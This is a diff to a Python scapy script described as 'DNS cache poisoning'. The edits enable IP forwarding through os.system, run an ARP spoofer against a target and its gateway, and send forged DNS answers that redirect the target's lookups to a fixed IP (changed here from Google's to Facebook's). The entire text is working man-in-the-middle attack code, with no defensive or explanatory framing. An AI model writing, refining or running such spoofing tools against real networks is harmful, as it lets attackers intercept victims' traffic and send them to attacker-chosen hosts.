@@ -8,8 +8,9 @@ from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether, getmacbyip
 import threading
 import arpspoofer
-import subprocess
+from os import system
 
+system('sysctl net.ipv4.ip_forward=1')
 args_parser = argparse.ArgumentParser(prog='DNSSEC', description='DNS cache poisoning')
 
 args_parser.add_argument('-i', '--iface', type=str, help="Interface you wish to use")
@@ -27,7 +28,7 @@ TARGET_MAC = getmacbyip(TARGET_IP)
 
 SELF_MAC = get_if_hwaddr(conf.iface)
 
-FAKE_IP = '216.58.212.196'  # google.com
+FAKE_IP = '157.240.214.35'  # facebook.com
 
 
 def forward_to_gw(pkt):
@@ -38,7 +39,7 @@ def forward_to_gw(pkt):
         dst=pkt[IP].src, src=pkt[IP].dst
     ) / UDP(
         sport=pkt[UDP].dport, dport=pkt[UDP].sport
-    ) / DNS(qr=1, id=pkt[DNS].id, ancount=1, qd=DNSQR(pkt[DNS][DNSQR]),
+    ) / DNS(qr=1, id=pkt[DNS].id, ancount=1, qd=pkt[DNS][DNSQR],
             an=DNSRR(rrname=pkt[DNSQR].qname, rdata=FAKE_IP))
     sendp(pkt, verbose=0, iface=interface)
 
@@ -46,7 +47,7 @@ def forward_to_gw(pkt):
 def main():
     threading.Thread(
         target=arpspoofer.main,
-        args=(args.iface, TARGET_IP,
+        args=(interface, TARGET_IP,
               GW_IP,
               args.delay,  # delay between messages
               )
